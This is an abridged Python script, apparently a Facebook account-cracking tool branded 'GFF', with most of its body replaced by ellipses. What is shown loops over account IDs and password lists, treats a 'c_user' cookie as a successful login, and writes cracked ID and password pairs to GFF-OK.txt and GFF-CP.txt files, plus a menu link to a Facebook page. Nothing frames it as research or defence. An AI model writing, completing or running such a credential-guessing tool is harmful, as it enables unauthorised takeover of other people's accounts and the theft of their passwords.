...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/GFF.OFFICIAL.ACCOUNT');menu()
...
def mmm(ids,names,passlist):
	...
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mGFF\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[GFF-OK] '+ids+' | '+pas+'\033[1;32m')

				open('/sdcard/GFF-OK.txt', 'a').write(ids+'|'+pas+'\n')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[GFF-CP] '+ids+' | '+pas+'\33[0;97m')

					open('/sdcard/GFF-CP.txt', 'a').write(ids+'|'+pas+'\n')
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					...
					print('\33[1;91m[GFF-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				print('\033[1;92m[GFF-OK] '+cid+' | '+ps+'\033[1;32m')

				open('GFF-OK.txt', 'a').write(cid+' | '+ps+'\n')
				...
				print('\33[1;31m[GFF-CP] '+cid+' | '+ps+'\33[0;97m')

				open('GFF-CP.txt', 'a').write(cid+' | '+ps+'\n')
